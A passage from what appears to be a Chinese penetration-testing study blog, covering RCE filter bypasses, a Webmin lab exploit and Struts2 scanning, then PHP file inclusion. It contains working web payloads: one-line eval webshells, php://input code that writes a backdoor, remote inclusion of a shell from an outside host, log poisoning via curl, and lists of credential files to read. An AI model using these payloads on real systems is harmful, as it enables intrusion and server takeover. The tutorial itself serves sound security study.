class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$IFS$<span class="number">1</span>　　　　　　<span class="comment">//$1改成$加其他数字都行，都能当作空格来用</span></span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p>绕过关键词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac flag.txt</span><br></pre></td></tr></table></figure><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><ul><li><p><strong>代码审计</strong></p><p>最主要的方式，借助代码审计工具，非常方便的审计出此类漏洞</p></li><li><p><strong>已知的CMS漏洞</strong></p></li></ul><p>已知的CMS，有很多每年都会爆出来很多此类的漏洞</p><ul><li><p><strong>页面传参查找</strong></p><pre><code>  针对页面有传参的地方，重点关注传入恶意代码尝试，概率相对较低</code></pre></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="墨者靶场黑盒层-RCE-漏洞检测-公开漏洞"><a href="#墨者靶场黑盒层-RCE-漏洞检测-公开漏洞" class="headerlink" title="墨者靶场黑盒层 RCE 漏洞检测-公开漏洞"></a>墨者靶场黑盒层 RCE 漏洞检测-公开漏洞</h3><p><strong>Webmin未经身份验证的远程代码执行</strong></p><p>Webmin是基于Web的Unix系统管理工具。为了降低 Linux系统的管理难度，有时候会对公司内的Linux主机或VPS系统预装了网页管理工具webmin。</p><p>Webmin的RCE漏洞存在于密码重置页面中。该页面允许未经身份验证的用户通过简单的POST请求执行任意命令。</p><p><a href="https://www.cnblogs.com/whoami101/p/11465877.html">https://www.cnblogs.com/whoami101/p/11465877.html</a></p><p>在注册界面提交后BP抓包，将post的URL改为<code>/password_change.cgi</code>（修改密码的URL），post请求主体改为old等参数。其中使用old参数作为命令执行的入口，令old&#x3D;{shell}：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/009994f56d66a163e07fa85f74ccc4c5737559ec.png@692w_365h_progressive.webp" alt="img"></p><p>这里old&#x3D;ls，所以输出了服务器的当前文件目录（这里是直接在浏览器F12调试中修改的数据包）：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804163823614.png" alt="image-20220804163823614"></p><p>然后令old&#x3D;&#x2F;key.txt读取文件，获得flag。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804164230310.png" alt="image-20220804164230310"></p><h3 id="Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面"><a href="#Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面" class="headerlink" title="Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面"></a>Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面</h3><p><strong>Apache Struts2远程代码执行漏洞（S2-037复现）</strong></p><p>Struts2漏洞检查工具2019版 V2.3 by shack2 20190927</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804190810468.png" alt="image-20220804190810468"></p><p>struts2漏洞扫描工具：<strong>Struts2-Scan</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#工具参数说明（Struts2批量扫描利用工具）：</span><br><span class="line"></span><br><span class="line">---Usage: Struts2Scan.py [OPTIONS]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -i, --info          漏洞信息介绍</span><br><span class="line">  -v, --version       显示工具版本</span><br><span class="line">  -u, --url TEXT      URL地址</span><br><span class="line">  -n, --name TEXT     指定漏洞名称, 漏洞名称详见info</span><br><span class="line">  -f, --file TEXT     批量扫描URL文件, 一行一个URL</span><br><span class="line">  -d, --data TEXT     POST参数, 需要使用的payload使用&#123;exp&#125;填充</span><br><span class="line">  -c, --encode TEXT   页面编码, 默认UTF-8编码</span><br><span class="line">  -p, --proxy TEXT    HTTP代理. 格式为http://ip:port</span><br><span class="line">  -t, --timeout TEXT  HTTP超时时间, 默认10s</span><br><span class="line">  -w, --workers TEXT  批量扫描进程数, 默认为10个进程</span><br><span class="line">  --header TEXT       HTTP请求头, 格式为: key1=value1&amp;key2=value2</span><br><span class="line">  -e, --exec          进入命令执行shell</span><br><span class="line">  --webpath           获取WEB路径</span><br><span class="line">  -r, --reverse TEXT  反弹shell地址, 格式为ip:port</span><br><span class="line">  --upfile TEXT       需要上传的文件路径和名称</span><br><span class="line">  --uppath TEXT       上传的目录和名称,如:/usr/local/tomcat/webapps/ROOT/shell.jsp</span><br><span class="line">  -q, --quiet         关闭打印不存在漏洞的输出，只保留存在漏洞的输出</span><br><span class="line">  -h, --help          Show this message and exit.</span><br></pre></td></tr></table></figure><p><strong>专业话语：</strong></p><p>EXP：Exploit漏洞利用代码，运行之后对目标进行攻击。<br>POC：Proof of Concept漏洞验证代码，检测目标是否存在对应漏洞。</p><h3 id="一句话-Webshell-后门原理代码执行-拓展说明"><a href="#一句话-Webshell-后门原理代码执行-拓展说明" class="headerlink" title="一句话 Webshell 后门原理代码执行-拓展说明"></a>一句话 Webshell 后门原理代码执行-拓展说明</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192441723.png" alt="image-20220804192441723"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192548559.png" alt="image-20220804192548559"></p><p>菜刀将操作系统的命令写入参数，以post方式传递给网站后门，网站后门通过eval()代码执行来执行系统命令或者代码，从而达到了菜刀远程操作服务器的目的.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCE-代码及命令执行漏洞&quot;&gt;&lt;a href=&quot;#RCE-代码及命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;RCE 代码及命令执行漏洞&quot;&gt;&lt;/a&gt;RCE 代码及命令执行漏洞&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://frankcao3.github.io/posts/59563"/>
    <id>https://frankcao3.github.io/posts/59563</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628991158390-b5543660-8083-4e31-9a9d-16edbbf6a1f0.png" alt="img"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>文件包含：</strong></p><p>文件包含即程序通过 <strong>包含函数</strong> 调用本地或远程文件，<strong>将文件内容作为脚本执行</strong>，以此来实现拓展功能。</p><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p><p><strong>文件包含漏洞原理</strong>:</p><p>文件包含漏洞是指<strong>当服务器php.ini文件中开启<code>allow_url_include</code>选项时</strong>，就可以通过PHP的某些特性函数，比如<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>，利用URL去动态包含文件，<strong>让当前页面去执行指定的另外一个文件中的代码内容</strong>。此时如果没有对文件来源进行严格审查，就会导致任意文件读取。黑客将很有可能让当前页面去执行超出 Web 目录中的文件，或者是 Web 目录中不希望被执行的敏感文件，甚至是远程服务器上的文件。</p><p>几乎所有的脚本语言中都提供文件包含的功能，但文件包含漏洞<strong>在 PHP 中居多</strong>，而在JSP、ASP、ASP.NET程序中非常少，甚至没有包含漏洞的存在。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件包含各个脚本代码</span></span><br><span class="line">ASP,PHP,JSP,ASPX等</span><br><span class="line"></span><br><span class="line">&lt;!-—<span class="comment">#include file=&quot;1.asp&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--<span class="comment">#include file=&quot;top.aspx&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;c:import url=<span class="string">&quot;http://lthief.one/1.jsp&quot;</span>&gt;    <span class="comment">// 远程文件包含</span></span><br><span class="line"></span><br><span class="line">&lt;jsp:<span class="keyword">include</span> page=<span class="string">&quot;head.jsp&quot;</span> / &gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="keyword">include</span> file=<span class="string">&quot;head.jsp&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span> (<span class="string">&#x27;test.php&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><ul><li><p><strong>白盒</strong></p><p>代码审计</p></li><li><p><strong>黑盒</strong></p><p>漏洞扫描工具；</p><p>公开漏洞；</p><p>手工查看参数值和功能点（看是不是接收一个文件名作为参数，或者该功能的实现会不会涉及include()之类的函数）。</p></li></ul><h2 id="PHP中常见包含文件的函数"><a href="#PHP中常见包含文件的函数" class="headerlink" title="PHP中常见包含文件的函数"></a>PHP中常见包含文件的函数</h2><h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>当使用该函数包含文件时，只有代码执行到<code>include()</code>函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://127.0.0.1:8080/include.php?filename=index.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$filename=$_GET[&#x27;filename&#x27;];</span></span><br><span class="line"><span class="comment">include ( $filename.&quot; .html&quot; );  // 文件后缀名增加了一个HTML作为限制</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如访问服务器本地1.txt的内容：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805084014410.png" alt="image-20220805084014410"></p><h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h3><p>功能与<code>include()</code>相同，区别在于<u>当重复调用同一文件时，程序只调用一次</u>。</p><h3 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h3><p><code>require()</code>与<code>include()</code>的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</p><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h3><p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>被包含的文件在<strong>服务器本地</strong>。</p><p><strong>利用条件：</strong></p><p><code>allow_url_include = On</code> </p><p>比如，以get请求实施文件包含攻击，查看服务器本地文件：<code>?page=a.php</code>、<code>?home=b.html</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// windows server</span><br><span class="line"></span><br><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line">c:\XX\httpd.conf  Apache配置信息</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br><span class="line"></span><br><span class="line">// Linux/Unix</span><br><span class="line"></span><br><span class="line">/etc/passwd 账户信息</span><br><span class="line">/etc/shadow  账户密码文件</span><br><span class="line">/etc/httpd/conf/httpd.conf  Apache配置文件</span><br><span class="line">/etc/my.conf  mysql 配置文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf  Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf   虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini PHP相关配置</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><strong>利用条件：</strong></p><p><code>allow_url_fopen = On</code> 是否允许将URL（HTTP，HTTPS等）作为文件打开处理</p><p><code>allow_url_include = On</code> 是否允许includeI()和require()函数包含URL（HTTP，HTTPS）作为文件解析处理</p><p>远程文件包含漏洞是因为开启了PHP配置中的<code>allow_url_fopen</code>选项，选项开启之后，<strong>服务器允许包含一个远程文件</strong>，服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p><p>比如使用 <code>http://192.168.75.138/shell.php</code> 来替换原 URL 中包含的文件名，可以远程执行 PHP 脚本。shell.php可以是一个一句话木马。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804213230082.png" alt="image-20220804213230082"></p><h2 id="x3D-x3D-PHP伪协议-x3D-x3D-（重要）"><a href="#x3D-x3D-PHP伪协议-x3D-x3D-（重要）" class="headerlink" title="&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;（重要）"></a>&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;（重要）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p><strong>各协议的利用条件和方法：</strong></p><p>参考：<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png" alt="img"></p><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>php 涉及到文件以及协议的地方默认使用 file 协议，如果没有写出协议名或者协议不存在，都会被当成 file 协议来解析。</p><p><code>file://[文件的绝对路径和文件名]</code></p><p>不受allow_url_fopen、allow_url_include 开启的限制。</p><p>如：<code>?a=file://C:/Windows/win.ini</code></p><h3 id="http-x2F-x2F-、ftp-x2F-x2F"><a href="#http-x2F-x2F-、ftp-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;</h3><p>访问 HTTP(s) 网址、访问 FTP(s) URLs。允许通过 HTTP 1.0 的 GET方法，以 <strong>只读</strong> 访问文件或资源，通常用于远程包含。</p><p><strong>需要allow_url_fopen &#x3D; On、allow_url_include &#x3D; On。</strong></p><p>比如包含木马文件<code>?a=http://vps.vps.vps.vps/shell.php</code></p><p>木马文件（shell.txt）内容：<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></p><h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a><strong>php:&#x2F;&#x2F;</strong></h3><p>访问各个输入&#x2F;输出流（I&#x2F;O streams）。经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。</p><p>包括<code>php://stdin</code>、<code>php://stdout</code>、<code>php://stderr</code>、<code>php://input</code>、<code>php://output</code>、<code>php://filter</code>、<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code> 九种。</p><ul><li><p><strong>php:&#x2F;&#x2F;input</strong></p><p>访问请求的原始数据的只读流，将post请求的数据当作php代码 <strong>执行</strong>。注意<code>enctype=“multipart/form-data”</code> 的时候<code>php://input</code>是无效的。</p><p><strong>需要allow_url_include &#x3D; On，但是不受 allow_url_fopen 影响。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?page=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">GetShell：</span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;hack.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]) ?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805094122145.png" alt="image-20220805094122145"></p></li><li><p><strong>php:&#x2F;&#x2F;filter</strong></p><p>数据流打开时的筛选过滤应用，<strong>读取&#x2F;解析</strong> 本地源代码。</p><p>不受 allow_url_fopen、allow_url_include 影响。</p><p><em>用于读取文件（增加base64编码）：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">// 将php文件通过base64编码读出（&quot;read=&quot;可以省略），若不用base64编码，php文件就会作为脚本执行，无法输出源代码。</span><br><span class="line"></span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">//读取文件源码</span><br></pre></td></tr></table></figure><p><em>用于解析（执行）文件，可用于getshell：</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用于GetShell（shell.txt需通过文件上传在目标服务器上）：</span><br><span class="line">木马文件（shell.txt）内容：&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">然后菜刀连接 http://localhost/test.php?file=php://filter/resource=./1.txt 即可。</span><br></pre></td></tr></table></figure></li></ul><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p><strong>需要allow_url_fopen&#x3D;On，allow_url_include&#x3D;On。</strong></p><p>将data:&#x2F;&#x2F;所指内容 <strong>执行</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,待执行的文本内容</span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo(); ?&gt;</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805094336370.png" alt="image-20220805094336370"></p><h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 <strong>执行</strong>。</p><p><strong>不受 allow_url_fopen、allow_url_include 影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=zip://D:/phpStudy/WWW/file.zip%23code.txt</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内的子文件名]</span><br><span class="line">注：文件路径必须为绝对路径；zip文件后缀名可以改为其他如图片后缀；#进行url编码为%23</span><br></pre></td></tr></table></figure><h3 id="zlib-x2F-x2F-、bzip2-x2F-x2F"><a href="#zlib-x2F-x2F-、bzip2-x2F-x2F" class="headerlink" title="zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;</h3><p>压缩流，可以访问压缩文件中的子文件，将子文件的内容当做 php 代码 <strong>执行</strong>。</p><p><strong>不受 allow_url_fopen、allow_url_include 影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=compress.zlib://file.zip</span><br><span class="line">注：文件路径无绝对路径限制；zlib://协议文件压缩为zip或gz都可以，bzip2://协议文件压缩为bz2；后缀名也可以改为其他，如图片后缀</span><br></pre></td></tr></table></figure><h2 id="各种文件包含"><a href="#各种文件包含" class="headerlink" title="各种文件包含"></a>各种文件包含</h2><h3 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>利用网站报错日志写入木马程序。</p><p>流程如下：</p><ul><li>首先需要找到日志文件的存储位置</li><li>借助报错，往日志文件写木马</li><li>使用工具（菜刀或者蚁剑）连接</li></ul><h3 id="包含上传文件（先上传，后包含）"><a href="#包含上传文件（先上传，后包含）" class="headerlink" title="包含上传文件（先上传，后包含）"></a>包含上传文件（先上传，后包含）</h3><p>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code>。</p><p>图片代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;pass&#x27;]);?&gt;&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在index.php所在的目录下生成shell.php</strong>。</p><h3 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h3><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p><p>前提是知道日志的物理存放路径。</p><p><strong>日志默认路径</strong></p><ol><li><p><strong>apache+Linux日志默认路径</strong></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/logs/access_log  </span><br><span class="line">    /var/log/httpd/access_log</span><br></pre></td></tr></table></figure></li><li><p><strong>apache+win2003日志默认路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\xampp\apache\logs\access.log</span><br><span class="line">D:\xampp\apache\logs\error.log</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS6.0+win2003默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS7.0+win2003 默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure></li><li><p><strong>nginx 日志文件</strong></p><p>日志文件在用户安装目录logs目录下。以我的安装路径为例<code>/usr/local/nginx</code>，那我的日志目录就是在<code>/usr/local/nginx/logs</code>里。</p></li></ol><p><strong>web中间件默认配置</strong></p><ol><li><p><strong>apache+linux 默认配置文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">index.php?page=/etc/init.d/httpd</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS6.0+win2003 配置文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Windows/system32/inetsrv/metabase.xml</span><br></pre></td></tr></table></figure></li><li><p><strong>IIS7.0+WIN 配置文件</strong></p></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure><p><strong>curl 构造一句话，写入日志文件测试记录</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;http://127.0.0.1/php/1.php?page=&lt;?php @eval($_POST\[123\]);?&gt;&quot;?page=&lt;?php @eval($_POST\[123\]);?&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>可以先尝试包含到session文件，再根据session文件内容寻找可控变量，再构造payload插入到文件中，最后包含即可。</p><p><strong>前提</strong></p><ul><li>找到Session内的可控变量</li><li>Session文件可读写，并且知道存储路径</li></ul><p>session常见存储路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line">session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</span><br></pre></td></tr></table></figure><h3 id="包含-x2F-pros-x2F-self-x2F-environ"><a href="#包含-x2F-pros-x2F-self-x2F-environ" class="headerlink" title="包含&#x2F;pros&#x2F;self&#x2F;environ"></a>包含&#x2F;pros&#x2F;self&#x2F;environ</h3><p><code>proc/self/environ</code>中会保存<code>user-agent</code>头，如果在<code>user-agent</code>中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p><p>利用条件：</p><ul><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ul><figure class="highlight 